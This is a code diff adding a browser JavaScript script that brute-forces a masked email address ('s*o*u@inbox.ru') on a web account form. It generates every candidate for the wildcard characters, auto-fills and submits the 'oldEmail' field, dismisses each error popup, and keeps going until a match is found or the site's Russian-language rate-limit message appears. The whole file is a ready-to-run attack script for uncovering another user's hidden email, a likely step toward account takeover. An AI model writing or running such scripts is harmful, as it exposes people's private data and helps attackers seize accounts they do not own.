@@ -1,0 +1,114 @@
+function generateCombinations(oldEmailPattern) {
+  const combinations = [];
+  const lowercaseLetters = 'abcdefghijklmnopqrstuvwxyz';
+  const uppercaseLetters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  const numbers = '0123456789';
+  const patternArr = oldEmailPattern.split('');
+
+  function generate(index, isFirstStep) {
+    if (index === patternArr.length) {
+      combinations.push(patternArr.join(''));
+      return;
+    }
+
+    if (patternArr[index] === '*') {
+      if (isFirstStep) {
+        for (let char of lowercaseLetters) {
+          patternArr[index] = char;
+          generate(index + 1, isFirstStep);
+        }
+      } else {
+        for (let char of numbers) {
+          patternArr[index] = char;
+          generate(index + 1, isFirstStep);
+        }
+        for (let char of uppercaseLetters) {
+          patternArr[index] = char;
+          generate(index + 1, isFirstStep);
+        }
+      }
+      patternArr[index] = '*';
+    } else {
+      generate(index + 1, isFirstStep);
+    }
+  }
+
+  generate(0, true); // First step: lowercase letter values
+  generate(0, false); // Second step: number and uppercase letter values
+  return combinations;
+}
+
+async function copyPasteWithDelay(inputElement, text) {
+  inputElement.value = text;
+  inputElement.dispatchEvent(new Event('input'));
+  await new Promise((resolve) => setTimeout(resolve, 160)); // 20% of the original delay (200 milliseconds)
+  inputElement.select();
+  document.execCommand('copy');
+  inputElement.dispatchEvent(new Event('input'));
+}
+
+async function simulateMouseClickWithDelay(element) {
+  const clickEvent = new MouseEvent('click', {
+    view: window,
+    bubbles: true,
+    cancelable: true,
+  });
+  element.dispatchEvent(clickEvent);
+  await new Promise((resolve) => setTimeout(resolve, 160)); // 20% of the original delay (200 milliseconds)
+}
+
+async function emptyEmailField(inputElement) {
+  inputElement.select();
+  await new Promise((resolve) => setTimeout(resolve, 96)); // 20% of the original delay (120 milliseconds)
+  inputElement.value = '';
+  inputElement.dispatchEvent(new Event('input'));
+}
+
+async function guessOldEmailValue() {
+  const oldEmailPattern = "s*o*u@inbox.ru";
+  const combinations = generateCombinations(oldEmailPattern);
+
+  const oldEmailInput = document.querySelector('input[name="oldEmail"]');
+  const submitButton = document.querySelector('.cp-login-button');
+
+  let i = 0;
+
+  async function tryCombination() {
+    if (i >= combinations.length) {
+      console.log("No match found!");
+      return;
+    }
+
+    await emptyEmailField(oldEmailInput);
+    await copyPasteWithDelay(oldEmailInput, combinations[i]);
+    await simulateMouseClickWithDelay(submitButton);
+
+    const errorMessageInterval = setInterval(() => {
+      const errorMessage = document.querySelector('.fancybox-slide--html');
+      if (errorMessage) {
+        const errorMessageContent = errorMessage.querySelector('.fancybox-content').textContent;
+        if (
+          errorMessageContent.trim() === "Отправка запроса возможна не чаще чем 1 раз в 15 минут." ||
+          errorMessageContent.trim() === "Отправка E-mail возможна не чаще 1 раза в 10 минут."
+        ) {
+          console.log("Request limit reached. Stopping the script.");
+          clearInterval(errorMessageInterval);
+          return;
+        }
+
+        console.log("Wrong address found:", combinations[i]);
+        clearInterval(errorMessageInterval);
+
+        const closeButton = errorMessage.querySelector('[data-fancybox-close]');
+        if (closeButton) closeButton.click();
+
+        i++;
+        tryCombination();
+      }
+    }, 80); // 20% of the original delay (100 milliseconds)
+  }
+
+  tryCombination();
+}
+
+guessOldEmailValue();
